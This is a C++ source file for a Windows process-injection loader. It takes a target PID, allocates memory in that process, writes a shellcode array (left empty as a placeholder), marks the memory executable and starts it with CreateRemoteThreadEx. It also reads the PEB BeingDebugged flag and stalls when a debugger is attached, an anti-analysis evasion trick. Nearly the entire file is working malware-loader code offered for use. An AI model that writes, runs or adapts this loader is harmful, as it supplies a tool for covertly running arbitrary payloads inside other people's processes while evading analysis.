#include <cstdio>
#include <Windows.h>


typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;

const char* my_strings[17] = { "[!] PEB Read, Debugger Present\0", "[!] Access Denied\0", "[!] PID does not exist\0", "[!] Failed to get handle\0", 
"[+] Got handle to the process\0", "[!] Failed to write memory, access denied\0", "[+] Closing handle to process\0", "[!] Failed to allocate memory\0",
"[+] Allocating memory, base address\0", "[+] Successfully wrote data\0", "[!] Failed to write data\0", "[!] Failed to change page permissions\0",
"[+] Changed page permissions\0", "[!] Failed to create thread\0", "[+] Killing thread\0", "[+] Create Thread\0", "[+] Thread Finished\0"};

DWORD dwPID = 0;	//32 bit unsigned int 

//put your data here in the 0x00,0x00 format
const UCHAR MY_Data[] = { 0 };

SIZE_T szMY_Data = sizeof(MY_Data);


int do_sleep() {
	DWORD sleep_time = 1000000;
	Sleep(sleep_time);
	return EXIT_FAILURE;
}


int main(int argc, char* argv[]) {


	PPEB					pPeb = (PEB*)(__readgsqword(0x60));

	// checking the 'BeingDebugged' element
	if (pPeb->BeingDebugged == 1) {
		printf("%s\n", my_strings[0]);
		do_sleep();
		return EXIT_FAILURE;
	}
	

	//Ensure user supplied PID at the command line 
	if (argc < 2) {
		printf("[!] Usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	dwPID = atoi(argv[1]); //Convert the user supplied pid to an int


	//Get handle to process baesd on user supplied PID
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPID);
	//if return value is NULL something went wrong and we could not get the handle 
	if (handle == NULL) {
		//Did the user give us a pid at a high privelege level
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("%s\n", my_strings[1]);
			return EXIT_FAILURE;
		}
		//Did the user give us a pid that does not exist
		else if (GetLastError() == ERROR_INVALID_PARAMETER) {
			printf("%s\n", my_strings[2]);
			return EXIT_FAILURE;
		}
		else {
			//Everything went well and we got a handle to the specified process 
			//printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
			printf("%s: 0x%p\n", my_strings[3], (void*)GetLastError());
			return EXIT_FAILURE;
		}
	}

	printf("%s: 0x%p\n", my_strings[4], handle);

	LPVOID myAllocation = VirtualAllocEx(
		handle,						//Return back a handle to this process
		NULL,						//Let windows decide where to alloc the memory
		szMY_Data,					//Size of cString
		MEM_COMMIT | MEM_RESERVE,	//Commit and reserve in one step 
		PAGE_READWRITE);			//Memory Constant 
	
	//if NULL returned something didnt work 
	if (myAllocation == NULL) {
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			printf("%s\n", my_strings[5]);
			if (handle) {
				printf("%s\n", my_strings[6]);
				CloseHandle(handle);
			}
		}
		else {
			printf("%s: 0x%p\n", my_strings[7], (void*)GetLastError());
			if (handle) {
				printf("%s\n", my_strings[6]);
				CloseHandle(handle);
			}
		}
	}
	
	//Returns back the base address of allocated memory
	printf("%s: 0x%p\n", my_strings[8], myAllocation);

	//Now lets write our string to memory 
	//handle --> the handle to the process we want to inject into 
	//myAllocation --> the base address returned back by VritualAllocEx
	//&cString --> pointer to the thing we are writing 
	//nSize --> the size of the thing we are writing 
	//NULL --> dont care about this, can be ignored 
	BOOL writeMemory = WriteProcessMemory(handle, myAllocation, MY_Data, szMY_Data, NULL);
	if (writeMemory) {
		printf("%s\n", my_strings[9]);
	}
	else {
		printf("%s: 0x%p\n", my_strings[10], (void*)GetLastError());
		return EXIT_FAILURE;
	}

	//change memory protections here 
	DWORD flOldProtect = 0;		//holds the old memory constant 

	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);

	if (changePerms == 0) {
		printf("%s: 0x%p\n", my_strings[11], GetLastError);
		return EXIT_FAILURE;
	}

	printf("%s\n", my_strings[12]);



	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
	if (cThread == NULL) {
		printf("%s: 0x%p\n", my_strings[13], (void*)GetLastError());
		if (cThread) {
			printf("%s\n", my_strings[14]);
			CloseHandle(cThread);
			return EXIT_FAILURE;
		}
	}

	printf("%s: 0x%p\n", my_strings[15], cThread);

	WaitForSingleObject(cThread, INFINITE);
	printf("%s\n", my_strings[16]);



}
